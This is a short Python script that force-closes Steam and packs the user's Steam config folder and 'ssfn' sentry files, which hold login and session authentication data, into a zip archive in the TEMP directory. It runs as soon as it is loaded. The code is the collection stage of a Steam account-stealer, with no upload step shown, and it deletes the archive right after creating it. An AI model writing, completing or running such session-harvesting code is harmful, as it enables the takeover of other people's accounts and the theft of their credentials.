import os
import zipfile

def kill_process(process_name):
    result = os.system(f"taskkill /F /IM {process_name}")
    if result == 0:
        print(f"Process {process_name} has been killed successfully.")
    else:
        print(f"Failed to kill process {process_name}.")
        
def steam_st():
    kill_process("Steam.exe")
    steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
    if os.path.exists(steam_path):
        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
        steam_config_path = os.path.join(steam_path, "config")

        zip_path = os.path.join(os.environ['TEMP'], "steam_session.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, dirs, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
                for ssfn_file in ssfn_files:
                    zp.write(ssfn_file, os.path.basename(ssfn_file))

        os.remove(zip_path)

steam_st()
